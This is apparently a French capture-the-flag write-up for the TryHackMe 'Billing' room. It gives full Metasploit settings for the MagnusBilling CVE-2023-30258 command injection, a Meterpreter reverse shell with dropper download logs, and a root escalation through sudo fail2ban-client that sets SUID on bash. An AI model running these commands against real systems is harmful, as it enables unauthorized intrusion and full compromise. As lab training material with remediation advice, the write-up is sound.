# BILLING - TRY HACK ME ROOM

- **Difficulté :** Easy
- **Adresse IP :** `10.82.148.53`
- **Indice :** Some mistakes can be costly.
- **Objectifs :** User flag et Root flag

## 1. Reconnaissance

### 1.1. Scan des ports

Nous commençons par identifier les services exposés avec RustScan et Nmap.

Ports ouverts observés :

| Port | Service | Intérêt |
|---|---|---|
| 22/tcp | SSH | Accès distant |
| 80/tcp | HTTP | Application web |
| 3306/tcp | MySQL | Base de données |
| 5038/tcp | Asterisk Manager Interface | Gestion d'Asterisk |

Le port HTTP constitue notre principal point d'entrée pour la suite de l'investigation.

### 1.2. Identification de l'application web

La page d'accueil redirige vers `/mbilling`, ce qui suggère la présence de MagnusBilling.

Nous utilisons Nuclei pour confirmer cette piste.

Détection des technologies :

```bash
nuclei -u http://10.82.148.53 -tags tech-detect -v
```

Recherche du panneau MagnusBilling :

```bash
nuclei -u http://10.82.148.53 \
  -t http/exposed-panels/mbilling-panel.yaml -v
```

Résultat :

```text
[mbilling-panel] [http] [info] http://10.82.148.53/mbilling/
```

Ce résultat confirme l'exposition du panneau MagnusBilling, mais ne suffit pas, à lui seul, à démontrer une vulnérabilité.

### 1.3. Recherche de connexions par défaut

```bash
nuclei -u http://10.82.148.53 \
  -t http/default-logins/magnusbilling/magnusbilling-default-login.yaml -v
```

Résultat :

```text
[INF] Scan completed ... No results found.
```

Aucun résultat n'a été détecté par ce template. Cela ne prouve pas que toutes les combinaisons d'identifiants par défaut sont impossibles, mais cette piste ne nous a pas fourni de résultat exploitable.

### 1.4. Identification de la version

Nous consultons le fichier README exposé par l'application :

```bash
curl -sS -i http://10.82.148.53/mbilling/README.md
```

Le document indique :

```text
# MagnusBilling 7
We are in MagnusBilling version 7.x.x
```

Nous disposons donc d'un indice fort concernant la branche 7.x de MagnusBilling.

**À retenir :** le fichier README fournit une indication de version, mais pas nécessairement le numéro exact de la version installée ni son niveau de correctifs.

## 2. Exploitation : CVE-2023-30258

### 2.1. Vulnérabilité identifiée

La vulnérabilité CVE-2023-30258 concerne une injection de commandes dans MagnusBilling.

Le module Metasploit utilisé est :

```text
exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```

Cette vulnérabilité permet, sur une installation affectée, d'exécuter des commandes à distance sans authentification préalable.

### 2.2. Configuration de Metasploit

Nous configurons la cible et le chemin de l'application :

```text
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS 10.82.148.53
set RPORT 80
set TARGETURI /mbilling
```

Nous utilisons un payload Meterpreter avec une connexion TCP inverse :

```text
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.130.110
set LPORT 4444
```

L'adresse `192.168.130.110` correspond à notre interface VPN TryHackMe.

Pour le mode Linux Dropper, le serveur HTTP temporaire doit utiliser un port libre. Le port 8080 étant déjà occupé localement, nous choisissons le port 8081 :

```text
set target 2
set SRVPORT 8081
show options
run
```

### 2.3. Validation de l'exploitation

Le module effectue un test d'injection de commandes en utilisant une commande `sleep`.

Résultat observé :

```text
[+] The target is vulnerable. Successfully tested command injection.
```

Le test prend environ le temps attendu, ce qui confirme l'exécution de la commande injectée.

Le module Linux Dropper télécharge ensuite le payload :

```text
[*] Using URL: http://192.168.130.110:8081/Fe7J0S
[*] Client 10.82.148.53 (Wget/1.21.3) requested /Fe7J0S
[*] Sending payload to 10.82.148.53 (Wget/1.21.3)
```

La session est finalement ouverte :

```text
[*] Meterpreter session 33 opened
(192.168.130.110:4444 -> 10.82.148.53:43854)
```

**Point important :** le téléchargement du payload et l'ouverture de la session confirment que la chaîne d'exploitation a fonctionné. Les sessions précédentes qui se fermaient immédiatement ne constituaient pas, à elles seules, une preuve d'échec de la vulnérabilité.

## 3. Accès utilisateur

### 3.1. Ouverture d'un shell système

Depuis Meterpreter :

```text
shell
```

Nous vérifions l'identité du processus distant :

```bash
id
whoami
```

Résultat :

```text
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
```

L'exécution des commandes s'effectue sous l'identité `asterisk`, utilisée par les services liés à Asterisk.

### 3.2. Énumération des répertoires utilisateurs

```bash
ls /home
ls /home/magnus
```

Le répertoire `/home/magnus` contient notamment le fichier `user.txt`.

Lecture du flag :

```bash
cat /home/magnus/user.txt
```

**User flag :**

```text
THM{redacted}
```

Le fait de pouvoir lire ce fichier ne signifie pas que nous sommes devenus l'utilisateur `magnus`. Notre identité reste `asterisk`.

## 4. Élévation de privilèges

### 4.1. Énumération des privilèges sudo

Nous examinons les commandes autorisées :

```bash
sudo -l
```

Résultat pertinent :

```text
User asterisk may run the following commands:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Cette configuration permet à `asterisk` d'exécuter `fail2ban-client` avec les privilèges d'autres utilisateurs, notamment `root`, sans saisir de mot de passe.

Il s'agit d'une piste d'élévation de privilèges liée à la configuration de Fail2ban.

### 4.2. Énumération de Fail2ban

Nous affichons les jails actives :

```bash
sudo /usr/bin/fail2ban-client status
```

Résultat :

```text
Number of jail: 8
Jail list: ast-cli-attck, ast-hgc-200, asterisk-iptables,
           asterisk-manager, ip-blacklist, mbilling_ddos,
           mbilling_login, sshd
```

Nous examinons ensuite les actions de la jail `asterisk-iptables` :

```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables actions
```

Résultat :

```text
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
```

Ces commandes nous permettent de découvrir la configuration active et les actions associées aux jails.

### 4.3. Exploitation de la configuration Fail2ban

Nous ajoutons une action appelée `evil` à la jail `sshd` :

```bash
sudo /usr/bin/fail2ban-client set sshd addaction evil
```

Puis nous définissons la commande exécutée lors d'un bannissement :

```bash
sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"
```

La commande configurée est :

```bash
chmod +s /bin/bash
```

Elle positionne le bit Set User ID (SUID) sur Bash.

Nous déclenchons ensuite l'action en demandant à Fail2ban de bannir une adresse IP de test :

```bash
sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.5
```

Dans notre laboratoire, cette opération déclenche la commande configurée. Bash se retrouve alors doté du bit SUID.

### 4.4. Passage à root

Nous vérifions ensuite l'effet de cette modification :

```bash
/bin/bash -p
```

L'option `-p` demande à Bash de préserver ses privilèges effectifs au lieu de les abandonner.

Vérification :

```bash
whoami
```

Résultat :

```text
root
```

Nous avons obtenu un shell avec les privilèges de `root`.

**Pourquoi cette élévation fonctionne :**

1. `asterisk` peut lancer `fail2ban-client` avec des privilèges élevés grâce à la règle sudo.
2. Nous ajoutons une action à une jail et configurons la commande `actionban`.
3. Le bannissement déclenche l'action configurée.
4. La commande `chmod +s /bin/bash` modifie les permissions de Bash.
5. L'exécution de Bash avec `-p` conserve les privilèges effectifs obtenus.

Le problème n'est donc pas simplement l'existence de Fail2ban : c'est la possibilité de contrôler une action exécutée avec des privilèges élevés.

### 4.5. Lecture du flag root

Depuis le shell root :

```bash
cat /root/root.txt
```

**Root flag :**

```text
THM{redacted}
```

## 5. Résumé de la chaîne d'attaque

```text
Reconnaissance des ports
        |
        v
Identification de MagnusBilling 7
        |
        v
CVE-2023-30258
Injection de commandes non authentifiée
        |
        v
Reverse shell Meterpreter
        |
        v
Shell sous l'identité asterisk
        |
        v
Énumération avec sudo -l
        |
        v
fail2ban-client autorisé sans mot de passe
        |
        v
Modification d'une action Fail2ban
        |
        v
Déclenchement de actionban
        |
        v
Bash avec bit SUID
        |
        v
Shell root avec bash -p
        |
        v
Lecture du root.txt
```

## 6. Enseignements

- **La reconnaissance oriente l'exploitation.** L'identification de MagnusBilling a permis de sélectionner un module pertinent.
- **Une détection n'est pas une preuve de vulnérabilité.** Le panneau exposé et le README ont orienté notre recherche ; le test d'injection de commandes a apporté une preuve plus directe.
- **Une session Meterpreter et un shell système sont différents.** Les commandes `id` et `whoami` ont confirmé l'identité réelle du processus distant.
- **Les permissions sudo méritent une attention particulière.** Un outil d'administration autorisé sans mot de passe peut devenir un vecteur d'élévation si ses fonctionnalités permettent de modifier ou de déclencher des actions privilégiées.
- **Il faut comprendre la chaîne complète.** L'exploitation initiale donne un accès sous `asterisk`, mais l'accès root résulte d'une mauvaise configuration distincte.
- **Les outils ne remplacent pas le raisonnement.** Chaque résultat doit être interprété et vérifié avant de conclure.

## 7. Points de remédiation

Pour éviter une chaîne d'attaque similaire :

- Mettre à jour MagnusBilling vers une version corrigée de la vulnérabilité.
- Réduire l'exposition des fichiers de documentation et des ressources inutiles.
- Limiter les commandes autorisées via sudo au strict nécessaire.
- Éviter de donner à un utilisateur de service la possibilité de modifier des actions privilégiées de Fail2ban.
- Examiner les permissions des exécutables système et supprimer les bits SUID injustifiés.
- Surveiller les modifications de configuration et les exécutions de commandes inhabituelles.

**Conclusion :** la room Billing illustre une chaîne complète, depuis une vulnérabilité applicative jusqu'à l'élévation de privilèges locale. La leçon centrale est de comprendre les mécanismes et les permissions qui relient chaque étape, plutôt que de retenir uniquement les commandes utilisées.
